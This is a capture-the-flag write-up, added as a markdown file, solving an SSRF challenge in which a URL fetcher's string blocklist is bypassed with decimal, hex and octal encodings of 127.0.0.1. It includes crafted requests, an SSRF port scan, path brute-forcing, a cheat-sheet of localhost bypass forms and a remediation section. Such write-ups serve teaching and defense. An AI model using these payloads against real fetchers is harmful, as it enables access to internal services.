@@ -1,0 +1,162 @@
+---
+title: "0xVoid: Loopback Lens"
+description: "A URL fetcher blocks the obvious localhost names but never resolves the host, so a decimal-encoded 127.0.0.1 walks straight past the blocklist to an internal-only route. A tour of SSRF loopback bypasses."
+date: 2026-08-17T20:58:02.227Z
+---
+
+**Platform:** 0xVoid (wave2)
+**Challenge:** Loopback Lens
+**Category:** Web
+**Subcategory:** SSRF
+**Points:** 500
+**Author:** 0x4sh
+
+> The public lens can fetch pages for you, but its private calibration route is supposed to exist only from inside the machine. The guard checks the obvious faces of localhost. Give it a less obvious mirror.
+
+Target: `http://35.192.106.100:21001/`
+
+## TL;DR
+
+`/lens?url=` is a classic SSRF fetcher guarded by a **naive string blocklist** (`127.`, `localhost`, `0.0.0.0`, `::1`). Numeric loopback encodings — **decimal `2130706433`**, hex `0x7f000001`, bare `0` — slip past the blocklist yet still resolve to `127.0.0.1`. Point the SSRF at the internal app on port **8080** and hit the internal-only route:
+
+```
+GET /lens?url=http://2130706433:8080/internal/flag HTTP/1.1
+Host: 35.192.106.100:21001
+```
+
+## Recon — understand the endpoint
+
+The homepage advertises the fetcher and the hint outright:
+
+```
+The lens fetches public pages through /lens?url=...
+A private calibration route exists inside the machine, but the filter refuses the obvious localhost names.
+```
+
+Sanity check the SSRF works (send from **Burp Repeater**):
+
+```
+GET /lens?url=http://example.com/ HTTP/1.1
+Host: 35.192.106.100:21001
+```
+
+→ `200 OK`, Example Domain HTML wrapped in `<pre>`. Confirmed: the server fetches arbitrary URLs and echoes the body back.
+
+## Map the filter
+
+Throw the obvious localhost forms at it in Repeater and watch the responses:
+
+| `url=` payload | Result | Meaning |
+|---|---|---|
+| `127.0.0.1` | `400 blocked` | blocklist hit |
+| `http://127.0.0.0` | `400 blocked` | blocks substring `127.` |
+| `http://127.127.127.127` | `400 blocked` | blocks substring `127.` |
+| `http://[0:0:0:0:0:ffff:127.0.0.1]` | `400 blocked` | contains `127.0.0.1` |
+| `http://[::1]/` | `400 blocked` | blocks `::1` |
+| `LOCALHOST` | `400 blocked` | blocklist is **case-insensitive** |
+| `file:///flag.txt` | `400 blocked` | non-http scheme blocked |
+| `http://2130706433/` | `502 URLError` | **passed filter**, connect failed (nothing on :80) |
+| `http://0x7f000001/` | `502 URLError` | **passed filter** |
+| `http://0/` | `200` (later) | **passed filter**, resolves to loopback |
+
+**Conclusion:** the guard is a pure **string blocklist** — it blocks `127.`, `localhost` (any case), `0.0.0.0`, `::1`, and non-`http(s)` schemes. It does **not** resolve the host and check `is_loopback`, so any alternate numeric encoding of 127.0.0.1 walks straight through.
+
+Why this works: `2130706433` is the 32-bit integer form of `127.0.0.1` (`127*256³ + 0 + 0 + 1`). `inet_aton()` / the socket layer happily parses decimal, hex (`0x7f000001`) and octal integer IPs, so the OS still connects to loopback — but the string never contains the blocked substrings.
+
+## Find the internal service (port scan via SSRF)
+
+Reaching loopback on port 80 gave `URLError` (nothing listening), so sweep common ports with the decimal bypass in Repeater:
+
+```
+GET /lens?url=http://2130706433:8080/ HTTP/1.1
+Host: 35.192.106.100:21001
+```
+
+| Port | Result |
+|---|---|
+| 80, 3000, 5000, 8000, 8888, 9000, 9090, 1337, 21001 | `502 URLError` (closed) |
+| **8080** | **`200 OK` — returns the app homepage** |
+
+The app itself is served internally on **127.0.0.1:8080** (21001 is just the external port-map). The private route lives on this internal app.
+
+**Reading the error codes is the whole game here:**
+
+- `502 fetch failed: URLError` → TCP connect failed → port closed.
+- `502 fetch failed: HTTPError` → the internal server **answered** with a non-2xx (404/403/400) → port open, wrong path/guard.
+- `200 OK` → internal server returned 2xx → the lens echoes the body (**this is what we want**).
+
+## (Optional) Confirm the outbound request with Collaborator
+
+To understand what the guard actually sees, aim the lens at a **Burp Collaborator** payload and inspect the interaction:
+
+```
+GET /lens?url=http://<payload>.oastify.com/probe HTTP/1.1
+Host: 35.192.106.100:21001
+```
+
+Collaborator's HTTP interaction shows exactly what the fetcher sends:
+
+```
+GET /probe HTTP/1.1
+Accept-Encoding: identity
+Host: <payload>.oastify.com
+User-Agent: LoopbackLens
+Connection: close
+```
+
+Takeaways:
+
+- The `Host` header the internal app receives = **the host in `url=`** (so `Host: 2130706433:8080`).
+- The fetcher **does not** copy your request headers (`User-Agent` is hard-coded), so you can't spoof `Host: 127.0.0.1` from the outside — the "inside only" gate depends on the real loopback connection, which is exactly what the SSRF gives you.
+
+## Locate the private route
+
+Path-brute the internal app through the decimal bypass. Direct external requests to guessed paths return the generic `404 not found`, and non-2xx paths via the lens all collapse to `HTTPError`, so brute and watch for a `200`:
+
+```
+GET /lens?url=http://2130706433:8080/internal/flag HTTP/1.1
+Host: 35.192.106.100:21001
+```
+
+**Tip:** send it to **Burp Intruder** — mark the path as the payload position:
+
+```
+GET /lens?url=http://2130706433:8080/§FUZZ§ HTTP/1.1
+Host: 35.192.106.100:21001
+```
+
+Wordlist ideas: `calibration`, `calibrate`, `internal`, `internal/flag`, `flag`, `flag.txt`, `admin`, `private`, `secret`, `calibration/flag`. Sort by response length / status — the flag response stands out (`200`, distinct length).
+
+Hit:
+
+```
+HTTP/1.0 200 OK
+Server: LoopbackLens/1.0 Python/3.12.14
+
+<pre>0xV01D{...}</pre>
+```
+
+## Root cause & remediation
+
+**Root cause:** SSRF protection implemented as a **string blocklist** on the raw URL. It never resolves the hostname, so alternate representations of loopback (decimal / hex / octal integer IPs, `0`, obscure IPv6 forms) bypass it, and any "internal only" route that trusts a loopback connection becomes reachable.
+
+**Fix:**
+
+1. Resolve the hostname first, then reject if **any** resolved address is loopback / link-local / private / multicast (`ipaddress.ip_address(...).is_loopback`, `is_private`, `is_link_local`, `is_reserved`).
+2. Re-resolve and re-validate **after** redirects (guard against DNS rebinding / redirect-to-internal).
+3. Use an **allowlist** of destination hosts and schemes instead of a blocklist.
+4. Don't rely on `Host` / `X-Forwarded-For` or "came from loopback" as an auth boundary for sensitive routes — put real authentication on them.
+
+## Cheat-sheet
+
+- **Localhost mirrors that bypass string filters:**
+  - Decimal: `2130706433`
+  - Hex: `0x7f000001`
+  - Octal: `0177.0.0.1` / `017700000001`
+  - Short: `127.1`, `0`
+  - IPv6: `[::1]`, `[::ffff:127.0.0.1]`, `[0:0:0:0:0:ffff:7f00:1]`
+  - DNS: `localtest.me`, `*.nip.io` (e.g. `127.0.0.1.nip.io`)
+- **Distinguish SSRF outcomes by error text:** `URLError` = port closed, `HTTPError` = open + non-2xx, `200` = win.
+- **Use Collaborator** to see the exact request the fetcher emits (headers, UA, redirect behaviour) — it removes guesswork about what the internal guard sees.
+
+*0xAdham*
